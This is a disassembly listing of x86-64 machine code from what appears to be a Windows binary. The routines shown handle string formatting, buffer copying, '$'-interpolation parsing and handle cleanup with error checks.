    69688cff:	e8 2f f6 ff ff       	call   0x69688333
    69688d04:	48 83 7b 08 00       	cmpq   $0x0,0x8(%rbx)
    69688d09:	7e 52                	jle    0x69688d5d
    69688d0b:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    69688d10:	ba 01 00 00 00       	mov    $0x1,%edx
    69688d15:	e8 49 eb ff ff       	call   0x69687863
    69688d1a:	48 8d 15 4f 5c 00 00 	lea    0x5c4f(%rip),%rdx        # 0x6968e970
    69688d21:	48 89 c1             	mov    %rax,%rcx
    69688d24:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    69688d29:	e8 4a 8c ff ff       	call   0x69681978
    69688d2e:	48 8b 53 08          	mov    0x8(%rbx),%rdx
    69688d32:	48 89 e9             	mov    %rbp,%rcx
    69688d35:	e8 b0 fe ff ff       	call   0x69688bea
    69688d3a:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    69688d3f:	ba 01 00 00 00       	mov    $0x1,%edx
    69688d44:	e8 1a eb ff ff       	call   0x69687863
    69688d49:	48 8d 15 00 5c 00 00 	lea    0x5c00(%rip),%rdx        # 0x6968e950
    69688d50:	48 89 c1             	mov    %rax,%rcx
    69688d53:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    69688d58:	e8 1b 8c ff ff       	call   0x69681978
    69688d5d:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
    69688d62:	31 c0                	xor    %eax,%eax
    69688d64:	48 85 d2             	test   %rdx,%rdx
    69688d67:	74 03                	je     0x69688d6c
    69688d69:	48 8b 02             	mov    (%rdx),%rax
    69688d6c:	48 29 f0             	sub    %rsi,%rax
    69688d6f:	4c 89 ee             	mov    %r13,%rsi
    69688d72:	41 bf 01 00 00 00    	mov    $0x1,%r15d
    69688d78:	48 29 c6             	sub    %rax,%rsi
    69688d7b:	48 85 f6             	test   %rsi,%rsi
    69688d7e:	49 0f 4e f6          	cmovle %r14,%rsi
    69688d82:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    69688d87:	ba 20 00 00 00       	mov    $0x20,%edx
    69688d8c:	49 ff c7             	inc    %r15
    69688d8f:	e8 de f2 ff ff       	call   0x69688072
    69688d94:	4c 39 fe             	cmp    %r15,%rsi
    69688d97:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    69688d9c:	7d e4                	jge    0x69688d82
    69688d9e:	48 8b 13             	mov    (%rbx),%rdx
    69688da1:	48 89 e9             	mov    %rbp,%rcx
    69688da4:	e8 8a f5 ff ff       	call   0x69688333
    69688da9:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    69688dae:	ba 01 00 00 00       	mov    $0x1,%edx
    69688db3:	e8 ab ea ff ff       	call   0x69687863
    69688db8:	48 8d 15 71 5b 00 00 	lea    0x5b71(%rip),%rdx        # 0x6968e930
    69688dbf:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    69688dc4:	48 89 c1             	mov    %rax,%rcx
    69688dc7:	48 ff c7             	inc    %rdi
    69688dca:	48 83 c3 18          	add    $0x18,%rbx
    69688dce:	e8 a5 8b ff ff       	call   0x69681978
    69688dd3:	e9 be fe ff ff       	jmp    0x69688c96
    69688dd8:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    69688ddd:	48 83 c4 38          	add    $0x38,%rsp
    69688de1:	5b                   	pop    %rbx
    69688de2:	5e                   	pop    %rsi
    69688de3:	5f                   	pop    %rdi
    69688de4:	5d                   	pop    %rbp
    69688de5:	41 5c                	pop    %r12
    69688de7:	41 5d                	pop    %r13
    69688de9:	41 5e                	pop    %r14
    69688deb:	41 5f                	pop    %r15
    69688ded:	c3                   	ret
    69688dee:	55                   	push   %rbp
    69688def:	57                   	push   %rdi
    69688df0:	56                   	push   %rsi
    69688df1:	53                   	push   %rbx
    69688df2:	48 81 ec 08 08 00 00 	sub    $0x808,%rsp
    69688df9:	ba d1 07 00 00       	mov    $0x7d1,%edx
    69688dfe:	48 8d 5c 24 2f       	lea    0x2f(%rsp),%rbx
    69688e03:	48 89 cd             	mov    %rcx,%rbp
    69688e06:	48 89 d9             	mov    %rbx,%rcx
    69688e09:	e8 be 8b ff ff       	call   0x696819cc
    69688e0e:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
    69688e12:	48 85 c9             	test   %rcx,%rcx
    69688e15:	75 04                	jne    0x69688e1b
    69688e17:	31 d2                	xor    %edx,%edx
    69688e19:	eb 47                	jmp    0x69688e62
    69688e1b:	48 83 39 00          	cmpq   $0x0,(%rcx)
    69688e1f:	74 f6                	je     0x69688e17
    69688e21:	e8 22 fe ff ff       	call   0x69688c48
    69688e26:	48 85 c0             	test   %rax,%rax
    69688e29:	49 89 c0             	mov    %rax,%r8
    69688e2c:	74 0e                	je     0x69688e3c
    69688e2e:	48 8b 10             	mov    (%rax),%rdx
    69688e31:	48 81 fa cf 07 00 00 	cmp    $0x7cf,%rdx
    69688e38:	7e 04                	jle    0x69688e3e
    69688e3a:	eb db                	jmp    0x69688e17
    69688e3c:	31 d2                	xor    %edx,%edx
    69688e3e:	4c 89 c1             	mov    %r8,%rcx
    69688e41:	48 89 df             	mov    %rbx,%rdi
    69688e44:	e8 b5 8a ff ff       	call   0x696818fe
    69688e49:	4d 85 c0             	test   %r8,%r8
    69688e4c:	48 89 c6             	mov    %rax,%rsi
    69688e4f:	48 89 d1             	mov    %rdx,%rcx
    69688e52:	f3 a4                	rep movsb (%rsi),(%rdi)
    69688e54:	74 c1                	je     0x69688e17
    69688e56:	49 8b 10             	mov    (%r8),%rdx
    69688e59:	48 81 fa b3 07 00 00 	cmp    $0x7b3,%rdx
    69688e60:	7f 19                	jg     0x69688e7b
    69688e62:	48 8d 04 13          	lea    (%rbx,%rdx,1),%rax
    69688e66:	b9 07 00 00 00       	mov    $0x7,%ecx
    69688e6b:	48 83 c2 1c          	add    $0x1c,%rdx
    69688e6f:	48 8d 35 1d 56 00 00 	lea    0x561d(%rip),%rsi        # 0x6968e493
    69688e76:	48 89 c7             	mov    %rax,%rdi
    69688e79:	f3 a5                	rep movsl (%rsi),(%rdi)
    69688e7b:	4c 8b 4d 18          	mov    0x18(%rbp),%r9
    69688e7f:	45 31 c0             	xor    %r8d,%r8d
    69688e82:	4d 85 c9             	test   %r9,%r9
    69688e85:	74 03                	je     0x69688e8a
    69688e87:	4d 8b 01             	mov    (%r9),%r8
    69688e8a:	4a 8d 04 02          	lea    (%rdx,%r8,1),%rax
    69688e8e:	48 3d cf 07 00 00    	cmp    $0x7cf,%rax
    69688e94:	7f 24                	jg     0x69688eba
    69688e96:	4c 89 c9             	mov    %r9,%rcx
    69688e99:	e8 60 8a ff ff       	call   0x696818fe
    69688e9e:	48 89 c6             	mov    %rax,%rsi
    69688ea1:	4c 89 c1             	mov    %r8,%rcx
    69688ea4:	48 8d 04 13          	lea    (%rbx,%rdx,1),%rax
    69688ea8:	48 89 c7             	mov    %rax,%rdi
    69688eab:	31 c0                	xor    %eax,%eax
    69688ead:	4d 85 c9             	test   %r9,%r9
    69688eb0:	f3 a4                	rep movsb (%rsi),(%rdi)
    69688eb2:	74 03                	je     0x69688eb7
    69688eb4:	49 8b 01             	mov    (%r9),%rax
    69688eb7:	48 01 c2             	add    %rax,%rdx
    69688eba:	48 81 fa cd 07 00 00 	cmp    $0x7cd,%rdx
    69688ec1:	7f 0a                	jg     0x69688ecd
    69688ec3:	66 c7 04 13 20 5b    	movw   $0x5b20,(%rbx,%rdx,1)
    69688ec9:	48 83 c2 02          	add    $0x2,%rdx
    69688ecd:	4c 8b 45 10          	mov    0x10(%rbp),%r8
    69688ed1:	31 c9                	xor    %ecx,%ecx
    69688ed3:	4d 85 c0             	test   %r8,%r8
    69688ed6:	74 17                	je     0x69688eef
    69688ed8:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    69688edc:	31 c0                	xor    %eax,%eax
    69688ede:	4c 89 c7             	mov    %r8,%rdi
    69688ee1:	f2 ae                	repnz scas (%rdi),%al
    69688ee3:	48 89 ce             	mov    %rcx,%rsi
    69688ee6:	48 f7 d6             	not    %rsi
    69688ee9:	48 89 f1             	mov    %rsi,%rcx
    69688eec:	48 ff c9             	dec    %rcx
    69688eef:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
    69688ef3:	48 3d cf 07 00 00    	cmp    $0x7cf,%rax
    69688ef9:	7f 22                	jg     0x69688f1d
    69688efb:	48 8d 04 13          	lea    (%rbx,%rdx,1),%rax
    69688eff:	4c 89 c6             	mov    %r8,%rsi
    69688f02:	48 89 c7             	mov    %rax,%rdi
    69688f05:	31 c0                	xor    %eax,%eax
    69688f07:	f3 a4                	rep movsb (%rsi),(%rdi)
    69688f09:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    69688f0d:	4c 89 c7             	mov    %r8,%rdi
    69688f10:	f2 ae                	repnz scas (%rdi),%al
    69688f12:	48 89 c8             	mov    %rcx,%rax
    69688f15:	48 f7 d0             	not    %rax
    69688f18:	48 8d 54 02 ff       	lea    -0x1(%rdx,%rax,1),%rdx
    69688f1d:	48 81 fa cd 07 00 00 	cmp    $0x7cd,%rdx
    69688f24:	7f 0a                	jg     0x69688f30
    69688f26:	66 c7 04 13 5d 0a    	movw   $0xa5d,(%rbx,%rdx,1)
    69688f2c:	48 83 c2 02          	add    $0x2,%rdx
    69688f30:	48 83 3d 50 b9 0f 00 	cmpq   $0x0,0xfb950(%rip)        # 0x69784888
    69688f37:	00 
    69688f38:	48 89 d9             	mov    %rbx,%rcx
    69688f3b:	75 07                	jne    0x69688f44
    69688f3d:	e8 73 07 00 00       	call   0x696896b5
    69688f42:	eb 0f                	jmp    0x69688f53
    69688f44:	e8 4f f4 ff ff       	call   0x69688398
    69688f49:	48 89 c1             	mov    %rax,%rcx
    69688f4c:	ff 15 36 b9 0f 00    	call   *0xfb936(%rip)        # 0x69784888
    69688f52:	90                   	nop
    69688f53:	48 81 c4 08 08 00 00 	add    $0x808,%rsp
    69688f5a:	5b                   	pop    %rbx
    69688f5b:	5e                   	pop    %rsi
    69688f5c:	5f                   	pop    %rdi
    69688f5d:	5d                   	pop    %rbp
    69688f5e:	c3                   	ret
    69688f5f:	53                   	push   %rbx
    69688f60:	48 83 ec 20          	sub    $0x20,%rsp
    69688f64:	48 8b 05 ad bc 0f 00 	mov    0xfbcad(%rip),%rax        # 0x69784c18
    69688f6b:	48 85 c0             	test   %rax,%rax
    69688f6e:	48 89 cb             	mov    %rcx,%rbx
    69688f71:	74 02                	je     0x69688f75
    69688f73:	ff d0                	call   *%rax
    69688f75:	48 89 d9             	mov    %rbx,%rcx
    69688f78:	48 83 c4 20          	add    $0x20,%rsp
    69688f7c:	5b                   	pop    %rbx
    69688f7d:	e9 6c fe ff ff       	jmp    0x69688dee
    69688f82:	53                   	push   %rbx
    69688f83:	48 83 ec 20          	sub    $0x20,%rsp
    69688f87:	48 8b 05 52 b8 0f 00 	mov    0xfb852(%rip),%rax        # 0x697847e0
    69688f8e:	48 85 c0             	test   %rax,%rax
    69688f91:	48 89 cb             	mov    %rcx,%rbx
    69688f94:	75 0e                	jne    0x69688fa4
    69688f96:	48 8b 05 73 bc 0f 00 	mov    0xfbc73(%rip),%rax        # 0x69784c10
    69688f9d:	48 85 c0             	test   %rax,%rax
    69688fa0:	75 0a                	jne    0x69688fac
    69688fa2:	eb 11                	jmp    0x69688fb5
    69688fa4:	ff d0                	call   *%rax
    69688fa6:	84 c0                	test   %al,%al
    69688fa8:	75 ec                	jne    0x69688f96
    69688faa:	eb 5a                	jmp    0x69689006
    69688fac:	48 89 d9             	mov    %rbx,%rcx
    69688faf:	ff d0                	call   *%rax
    69688fb1:	84 c0                	test   %al,%al
    69688fb3:	74 51                	je     0x69689006
    69688fb5:	48 83 3d 0b 1b 0f 00 	cmpq   $0x0,0xf1b0b(%rip)        # 0x6977aac8
    69688fbc:	00 
    69688fbd:	75 12                	jne    0x69688fd1
    69688fbf:	48 89 d9             	mov    %rbx,%rcx
    69688fc2:	e8 98 ff ff ff       	call   0x69688f5f
    69688fc7:	b9 01 00 00 00       	mov    $0x1,%ecx
    69688fcc:	e8 6f 36 00 00       	call   0x6968c640
    69688fd1:	48 8b 15 28 c1 0f 00 	mov    0xfc128(%rip),%rdx        # 0x69785100
    69688fd8:	48 8d 4b 28          	lea    0x28(%rbx),%rcx
    69688fdc:	e8 40 d5 ff ff       	call   0x69686521
    69688fe1:	48 8d 0d 18 c1 0f 00 	lea    0xfc118(%rip),%rcx        # 0x69785100
    69688fe8:	48 89 da             	mov    %rbx,%rdx
    69688feb:	e8 31 d5 ff ff       	call   0x69686521
    69688ff0:	48 8b 05 d1 1a 0f 00 	mov    0xf1ad1(%rip),%rax        # 0x6977aac8
    69688ff7:	ba 01 00 00 00       	mov    $0x1,%edx
    69688ffc:	48 8d 48 10          	lea    0x10(%rax),%rcx
    69689000:	e8 11 33 00 00       	call   0x6968c316
    69689005:	90                   	nop
    69689006:	48 83 c4 20          	add    $0x20,%rsp
    6968900a:	5b                   	pop    %rbx
    6968900b:	c3                   	ret
    6968900c:	57                   	push   %rdi
    6968900d:	56                   	push   %rsi
    6968900e:	53                   	push   %rbx
    6968900f:	48 83 ec 40          	sub    $0x40,%rsp
    69689013:	48 83 79 10 00       	cmpq   $0x0,0x10(%rcx)
    69689018:	48 89 cb             	mov    %rcx,%rbx
    6968901b:	75 04                	jne    0x69689021
    6968901d:	48 89 51 10          	mov    %rdx,0x10(%rcx)
    69689021:	4d 85 c0             	test   %r8,%r8
    69689024:	4c 89 44 24 70       	mov    %r8,0x70(%rsp)
    69689029:	74 70                	je     0x6968909b
    6968902b:	4d 85 c9             	test   %r9,%r9
    6968902e:	74 6b                	je     0x6968909b
    69689030:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
    69689035:	ba 18 00 00 00       	mov    $0x18,%edx
    6968903a:	48 89 f1             	mov    %rsi,%rcx
    6968903d:	e8 8a 89 ff ff       	call   0x696819cc
    69689042:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
    69689046:	48 8d 15 33 ba 0f 00 	lea    0xfba33(%rip),%rdx        # 0x69784a80
    6968904d:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
    69689052:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
    69689057:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
    6968905e:	00 
    6968905f:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
    69689064:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
    69689069:	e8 1d 09 00 00       	call   0x6968998b
    6968906e:	48 8d 4b 20          	lea    0x20(%rbx),%rcx
    69689072:	48 89 c2             	mov    %rax,%rdx
    69689075:	e8 a7 d4 ff ff       	call   0x69686521
    6968907a:	48 8b 53 20          	mov    0x20(%rbx),%rdx
    6968907e:	48 8b 02             	mov    (%rdx),%rax
    69689081:	48 8d 48 01          	lea    0x1(%rax),%rcx
    69689085:	48 6b c0 18          	imul   $0x18,%rax,%rax
    69689089:	48 89 0a             	mov    %rcx,(%rdx)
    6968908c:	b9 06 00 00 00       	mov    $0x6,%ecx
    69689091:	48 8d 44 02 10       	lea    0x10(%rdx,%rax,1),%rax
    69689096:	48 89 c7             	mov    %rax,%rdi
    69689099:	f3 a5                	rep movsl (%rsi),(%rdi)
    6968909b:	48 89 d9             	mov    %rbx,%rcx
    6968909e:	e8 df fe ff ff       	call   0x69688f82
    696890a3:	90                   	nop
    696890a4:	48 83 c4 40          	add    $0x40,%rsp
    696890a8:	5b                   	pop    %rbx
    696890a9:	5e                   	pop    %rsi
    696890aa:	5f                   	pop    %rdi
    696890ab:	c3                   	ret
    696890ac:	48 83 ec 38          	sub    $0x38,%rsp
    696890b0:	e8 28 fa ff ff       	call   0x69688add
    696890b5:	4c 8d 0d f4 53 00 00 	lea    0x53f4(%rip),%r9        # 0x6968e4b0
    696890bc:	48 c7 44 24 20 5f 00 	movq   $0x5f,0x20(%rsp)
    696890c3:	00 00 
    696890c5:	4c 8d 05 ee 53 00 00 	lea    0x53ee(%rip),%r8        # 0x6968e4ba
    696890cc:	48 89 c1             	mov    %rax,%rcx
    696890cf:	48 8d 15 b5 53 00 00 	lea    0x53b5(%rip),%rdx        # 0x6968e48b
    696890d6:	e8 31 ff ff ff       	call   0x6968900c
    696890db:	90                   	nop
    696890dc:	48 83 c4 38          	add    $0x38,%rsp
    696890e0:	c3                   	ret
    696890e1:	48 83 ec 28          	sub    $0x28,%rsp
    696890e5:	ff 15 dd 34 10 00    	call   *0x1034dd(%rip)        # 0x6978c5c8
    696890eb:	85 c0                	test   %eax,%eax
    696890ed:	75 0f                	jne    0x696890fe
    696890ef:	e8 0d 98 ff ff       	call   0x69682901
    696890f4:	31 d2                	xor    %edx,%edx
    696890f6:	89 c1                	mov    %eax,%ecx
    696890f8:	48 83 c4 28          	add    $0x28,%rsp
    696890fc:	eb ae                	jmp    0x696890ac
    696890fe:	48 83 c4 28          	add    $0x28,%rsp
    69689102:	c3                   	ret
    69689103:	53                   	push   %rbx
    69689104:	48 83 ec 20          	sub    $0x20,%rsp
    69689108:	48 89 cb             	mov    %rcx,%rbx
    6968910b:	48 8b 49 10          	mov    0x10(%rcx),%rcx
    6968910f:	48 85 c9             	test   %rcx,%rcx
    69689112:	74 0d                	je     0x69689121
    69689114:	e8 c8 ff ff ff       	call   0x696890e1
    69689119:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
    69689120:	00 
    69689121:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
    69689125:	48 85 c9             	test   %rcx,%rcx
    69689128:	74 0d                	je     0x69689137
    6968912a:	e8 b2 ff ff ff       	call   0x696890e1
    6968912f:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
    69689136:	00 
    69689137:	48 83 c4 20          	add    $0x20,%rsp
    6968913b:	5b                   	pop    %rbx
    6968913c:	c3                   	ret
    6968913d:	53                   	push   %rbx
    6968913e:	48 83 ec 20          	sub    $0x20,%rsp
    69689142:	f6 41 4d 10          	testb  $0x10,0x4d(%rcx)
    69689146:	48 89 cb             	mov    %rcx,%rbx
    69689149:	75 54                	jne    0x6968919f
    6968914b:	48 8b 49 30          	mov    0x30(%rcx),%rcx
    6968914f:	48 85 c9             	test   %rcx,%rcx
    69689152:	74 07                	je     0x6968915b
    69689154:	e8 de 91 ff ff       	call   0x69682337
    69689159:	eb 15                	jmp    0x69689170
    6968915b:	48 63 4b 18          	movslq 0x18(%rbx),%rcx
    6968915f:	83 f9 04             	cmp    $0x4,%ecx
    69689162:	7e 0c                	jle    0x69689170
    69689164:	e8 78 ff ff ff       	call   0x696890e1
    69689169:	c7 43 18 ff ff ff ff 	movl   $0xffffffff,0x18(%rbx)
    69689170:	48 63 4b 20          	movslq 0x20(%rbx),%rcx
    69689174:	39 4b 1c             	cmp    %ecx,0x1c(%rbx)
    69689177:	74 11                	je     0x6968918a
    69689179:	83 f9 04             	cmp    $0x4,%ecx
    6968917c:	7e 0c                	jle    0x6968918a
    6968917e:	e8 5e ff ff ff       	call   0x696890e1
    69689183:	c7 43 20 ff ff ff ff 	movl   $0xffffffff,0x20(%rbx)
    6968918a:	48 63 4b 1c          	movslq 0x1c(%rbx),%rcx
    6968918e:	83 f9 04             	cmp    $0x4,%ecx
    69689191:	7e 0c                	jle    0x6968919f
    69689193:	e8 49 ff ff ff       	call   0x696890e1
    69689198:	c7 43 1c ff ff ff ff 	movl   $0xffffffff,0x1c(%rbx)
    6968919f:	48 89 d9             	mov    %rbx,%rcx
    696891a2:	48 83 c4 20          	add    $0x20,%rsp
    696891a6:	5b                   	pop    %rbx
    696891a7:	e9 57 ff ff ff       	jmp    0x69689103
    696891ac:	56                   	push   %rsi
    696891ad:	53                   	push   %rbx
    696891ae:	48 83 ec 58          	sub    $0x58,%rsp
    696891b2:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
    696891b9:	00 00 
    696891bb:	48 89 cb             	mov    %rcx,%rbx
    696891be:	89 d6                	mov    %edx,%esi
    696891c0:	ff 15 9a b7 0f 00    	call   *0xfb79a(%rip)        # 0x69784960
    696891c6:	c7 44 24 30 02 00 00 	movl   $0x2,0x30(%rsp)
    696891cd:	00 
    696891ce:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
    696891d3:	48 89 da             	mov    %rbx,%rdx
    696891d6:	89 74 24 28          	mov    %esi,0x28(%rsp)
    696891da:	49 89 c0             	mov    %rax,%r8
    696891dd:	48 89 c1             	mov    %rax,%rcx
    696891e0:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
    696891e7:	00 
    696891e8:	ff 15 fa 87 0f 00    	call   *0xf87fa(%rip)        # 0x697819e8
    696891ee:	85 c0                	test   %eax,%eax
    696891f0:	75 0e                	jne    0x69689200
    696891f2:	e8 0a 97 ff ff       	call   0x69682901
    696891f7:	31 d2                	xor    %edx,%edx
    696891f9:	89 c1                	mov    %eax,%ecx
    696891fb:	e8 ac fe ff ff       	call   0x696890ac
    69689200:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
    69689205:	48 83 c4 58          	add    $0x58,%rsp
    69689209:	5b                   	pop    %rbx
    6968920a:	5e                   	pop    %rsi
    6968920b:	c3                   	ret
    6968920c:	48 83 ec 58          	sub    $0x58,%rsp
    69689210:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
    69689215:	49 89 ca             	mov    %rcx,%r10
    69689218:	49 89 d3             	mov    %rdx,%r11
    6968921b:	4c 89 c1             	mov    %r8,%rcx
    6968921e:	ba 18 00 00 00       	mov    $0x18,%edx
    69689223:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
    69689228:	e8 9f 87 ff ff       	call   0x696819cc
    6968922d:	45 31 c9             	xor    %r9d,%r9d
    69689230:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
    69689235:	c7 44 24 38 18 00 00 	movl   $0x18,0x38(%rsp)
    6968923c:	00 
    6968923d:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
    69689244:	00 00 
    69689246:	4c 89 da             	mov    %r11,%rdx
    69689249:	4c 89 d1             	mov    %r10,%rcx
    6968924c:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%rsp)
    69689253:	00 
    69689254:	ff 15 a6 33 10 00    	call   *0x1033a6(%rip)        # 0x6978c600
    6968925a:	85 c0                	test   %eax,%eax
    6968925c:	75 0f                	jne    0x6968926d
    6968925e:	e8 9e 96 ff ff       	call   0x69682901
    69689263:	31 d2                	xor    %edx,%edx
    69689265:	89 c1                	mov    %eax,%ecx
    69689267:	e8 40 fe ff ff       	call   0x696890ac
    6968926c:	90                   	nop
    6968926d:	48 83 c4 58          	add    $0x58,%rsp
    69689271:	c3                   	ret
    69689272:	56                   	push   %rsi
    69689273:	53                   	push   %rbx
    69689274:	48 83 ec 38          	sub    $0x38,%rsp
    69689278:	48 8d 0d 01 36 10 00 	lea    0x103601(%rip),%rcx        # 0x6978c880
    6968927f:	ba 30 00 00 00       	mov    $0x30,%edx
    69689284:	e8 ce df ff ff       	call   0x69687257
    69689289:	48 8d 0d b0 57 00 00 	lea    0x57b0(%rip),%rcx        # 0x6968ea40
    69689290:	48 89 c3             	mov    %rax,%rbx
    69689293:	48 8b 73 18          	mov    0x18(%rbx),%rsi
    69689297:	48 8d 05 22 c2 0f 00 	lea    0xfc222(%rip),%rax        # 0x697854c0
    6968929e:	48 89 03             	mov    %rax,(%rbx)
    696892a1:	48 8d 05 1f 52 00 00 	lea    0x521f(%rip),%rax        # 0x6968e4c7
    696892a8:	48 89 43 10          	mov    %rax,0x10(%rbx)
    696892ac:	e8 2a de ff ff       	call   0x696870db
    696892b1:	48 85 f6             	test   %rsi,%rsi
    696892b4:	48 89 43 18          	mov    %rax,0x18(%rbx)
    696892b8:	74 08                	je     0x696892c2
    696892ba:	48 89 f1             	mov    %rsi,%rcx
    696892bd:	e8 23 d1 ff ff       	call   0x696863e5
    696892c2:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
    696892c6:	31 d2                	xor    %edx,%edx
    696892c8:	e8 ce d0 ff ff       	call   0x6968639b
    696892cd:	4c 8d 0d fe 51 00 00 	lea    0x51fe(%rip),%r9        # 0x6968e4d2
    696892d4:	48 89 d9             	mov    %rbx,%rcx
    696892d7:	48 c7 44 24 20 68 0a 	movq   $0xa68,0x20(%rsp)
    696892de:	00 00 
    696892e0:	4c 8d 05 f8 51 00 00 	lea    0x51f8(%rip),%r8        # 0x6968e4df
    696892e7:	48 8d 15 d9 51 00 00 	lea    0x51d9(%rip),%rdx        # 0x6968e4c7
    696892ee:	e8 19 fd ff ff       	call   0x6968900c
    696892f3:	90                   	nop
    696892f4:	48 83 c4 38          	add    $0x38,%rsp
    696892f8:	5b                   	pop    %rbx
    696892f9:	5e                   	pop    %rsi
    696892fa:	c3                   	ret
    696892fb:	41 57                	push   %r15
    696892fd:	41 56                	push   %r14
    696892ff:	41 55                	push   %r13
    69689301:	41 54                	push   %r12
    69689303:	55                   	push   %rbp
    69689304:	57                   	push   %rdi
    69689305:	56                   	push   %rsi
    69689306:	53                   	push   %rbx
    69689307:	48 83 ec 28          	sub    $0x28,%rsp
    6968930b:	45 31 ed             	xor    %r13d,%r13d
    6968930e:	31 db                	xor    %ebx,%ebx
    69689310:	48 89 ce             	mov    %rcx,%rsi
    69689313:	48 89 d7             	mov    %rdx,%rdi
    69689316:	4d 89 c4             	mov    %r8,%r12
    69689319:	4d 8d 71 ff          	lea    -0x1(%r9),%r14
    6968931d:	4c 89 cd             	mov    %r9,%rbp
    69689320:	31 c9                	xor    %ecx,%ecx
    69689322:	48 85 ff             	test   %rdi,%rdi
    69689325:	74 03                	je     0x6968932a
    69689327:	48 8b 0f             	mov    (%rdi),%rcx
    6968932a:	48 39 cb             	cmp    %rcx,%rbx
    6968932d:	0f 8d 64 02 00 00    	jge    0x69689597
    69689333:	0f be 54 1f 10       	movsbl 0x10(%rdi,%rbx,1),%edx
    69689338:	4c 8d 7b 01          	lea    0x1(%rbx),%r15
    6968933c:	80 fa 24             	cmp    $0x24,%dl
    6968933f:	75 05                	jne    0x69689346
    69689341:	4c 39 f9             	cmp    %r15,%rcx
    69689344:	7f 18                	jg     0x6968935e
    69689346:	48 8b 0e             	mov    (%rsi),%rcx
    69689349:	4c 89 fb             	mov    %r15,%rbx
    6968934c:	e8 21 ed ff ff       	call   0x69688072
    69689351:	48 89 f1             	mov    %rsi,%rcx
    69689354:	48 89 c2             	mov    %rax,%rdx
    69689357:	e8 c9 d0 ff ff       	call   0x69686425
    6968935c:	eb c2                	jmp    0x69689320
    6968935e:	42 8a 44 3f 10       	mov    0x10(%rdi,%r15,1),%al
    69689363:	3c 5a                	cmp    $0x5a,%al
    69689365:	77 4c                	ja     0x696893b3
    69689367:	3c 41                	cmp    $0x41,%al
    69689369:	0f 83 8a 01 00 00    	jae    0x696894f9
    6968936f:	3c 2d                	cmp    $0x2d,%al
    69689371:	0f 84 af 00 00 00    	je     0x69689426
    69689377:	77 2d                	ja     0x696893a6
    69689379:	3c 23                	cmp    $0x23,%al
    6968937b:	74 64                	je     0x696893e1
    6968937d:	3c 24                	cmp    $0x24,%al
    6968937f:	0f 85 08 02 00 00    	jne    0x6968958d
    69689385:	48 8b 0e             	mov    (%rsi),%rcx
    69689388:	ba 24 00 00 00       	mov    $0x24,%edx
    6968938d:	48 83 c3 02          	add    $0x2,%rbx
    69689391:	e8 dc ec ff ff       	call   0x69688072
    69689396:	48 89 f1             	mov    %rsi,%rcx
    69689399:	48 89 c2             	mov    %rax,%rdx
    6968939c:	e8 84 d0 ff ff       	call   0x69686425
    696893a1:	e9 7a ff ff ff       	jmp    0x69689320
    696893a6:	8d 50 cf             	lea    -0x31(%rax),%edx
    696893a9:	80 fa 08             	cmp    $0x8,%dl
    696893ac:	76 7c                	jbe    0x6968942a
    696893ae:	e9 da 01 00 00       	jmp    0x6968958d
    696893b3:	3c 7a                	cmp    $0x7a,%al
    696893b5:	77 15                	ja     0x696893cc
    696893b7:	3c 61                	cmp    $0x61,%al
    696893b9:	0f 83 3a 01 00 00    	jae    0x696894f9
    696893bf:	3c 5f                	cmp    $0x5f,%al
    696893c1:	0f 85 c6 01 00 00    	jne    0x6968958d
    696893c7:	e9 2d 01 00 00       	jmp    0x696894f9
    696893cc:	3c 7b                	cmp    $0x7b,%al
    696893ce:	0f 84 95 00 00 00    	je     0x69689469
    696893d4:	3c 80                	cmp    $0x80,%al
    696893d6:	0f 82 b1 01 00 00    	jb     0x6968958d
    696893dc:	e9 18 01 00 00       	jmp    0x696894f9
    696893e1:	49 39 ed             	cmp    %rbp,%r13
    696893e4:	7c 05                	jl     0x696893eb
    696893e6:	e8 87 fe ff ff       	call   0x69689272
    696893eb:	4f 8d 3c ec          	lea    (%r12,%r13,8),%r15
    696893ef:	31 d2                	xor    %edx,%edx
    696893f1:	49 8b 07             	mov    (%r15),%rax
    696893f4:	48 85 c0             	test   %rax,%rax
    696893f7:	74 03                	je     0x696893fc
    696893f9:	48 8b 10             	mov    (%rax),%rdx
    696893fc:	48 8b 0e             	mov    (%rsi),%rcx
    696893ff:	48 83 c3 02          	add    $0x2,%rbx
    69689403:	49 ff c5             	inc    %r13
    69689406:	e8 58 e4 ff ff       	call   0x69687863
    6968940b:	48 89 f1             	mov    %rsi,%rcx
    6968940e:	48 89 c2             	mov    %rax,%rdx
    69689411:	e8 0f d0 ff ff       	call   0x69686425
    69689416:	49 8b 17             	mov    (%r15),%rdx
    69689419:	48 8b 0e             	mov    (%rsi),%rcx
    6968941c:	e8 7d 85 ff ff       	call   0x6968199e
    69689421:	e9 fa fe ff ff       	jmp    0x69689320
